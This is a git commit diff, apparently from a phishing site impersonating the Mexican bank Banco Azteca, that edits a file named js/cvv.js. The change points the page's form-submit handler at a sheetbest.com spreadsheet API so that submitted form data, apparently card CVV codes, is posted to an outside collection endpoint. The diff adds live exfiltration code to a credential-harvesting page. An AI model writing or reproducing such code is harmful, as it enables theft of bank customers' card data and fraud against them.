bc7d5e341def2af843d7fb8530c961e55100246a
banco-azteca-12e <robledofrancis4@gmail.com>
2026-01-12 13:02:16 -0600

    Update cvv.js

--- js/cvv.js
+++ js/cvv.js
@@ -7,7 +7,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://banco-azteca-12e.github.io/banco-azteca/', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/e0467f44-d5c5-4234-9ec2-fa3d8cd33e04', {
         method: 'POST',
         mode: 'cors',
         headers: {
